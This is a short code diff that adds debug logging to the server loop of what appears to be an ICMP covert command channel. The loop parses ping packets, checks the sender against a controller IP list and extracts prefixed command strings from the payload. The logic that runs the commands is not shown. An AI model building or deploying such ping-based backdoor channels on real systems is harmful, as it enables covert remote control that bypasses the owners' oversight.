@@ -56,6 +56,8 @@ def server():
             icmp_type, code, checksum, p_id, sequence = struct.unpack('!BBHHH', packet[20:28])
             icmp_data = packet[28:]
             
+            log(f"Received ICMP packet from {addr[0]}: Type={icmp_type}, Code={code}, ID={p_id}, Seq={sequence}, Data Length={len(icmp_data)}")
+            log(f"addr: {addr}, CONTROLLER_IPS: {CONTROLLER_IPS}")
             if icmp_type == 8 and addr[0] in CONTROLLER_IPS: 
                 if icmp_data.startswith(COMMAND_PREFIX):
                     command = icmp_data[len(COMMAND_PREFIX):].decode().strip()
